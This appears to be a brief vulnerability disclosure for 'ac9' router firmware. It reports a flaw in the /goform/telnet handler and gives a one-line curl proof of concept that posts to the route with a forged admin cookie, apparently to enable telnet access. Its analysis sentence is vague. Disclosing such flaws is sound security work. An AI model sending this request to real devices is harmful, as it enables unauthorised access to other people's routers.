| Firmware Name | Firmware Version          | Download Link |
| ------------- | ------------------------- | ------------- |
| ac9           | V1.0BR_V15.03.05.14_multi | none          |

## Analysis

![7bafb473eb0a2dc98d2a44fa608d91d](./assets/7bafb473eb0a2dc98d2a44fa608d91d.png)

An HTTP request within the handler function of the /goform/telnet route. This could lead to Shell Metacharacters.

## POC

```
curl -i -X POST http://192.168.0.1/goform/telnet -d aa=aa --cookie "user=admin" --http0.9
```

![a97142785f9e38e439db922d95928c7](./assets/a97142785f9e38e439db922d95928c7.png)

![327b16e4d39f97e297f44d3a5df7267](./assets/327b16e4d39f97e297f44d3a5df7267.png)

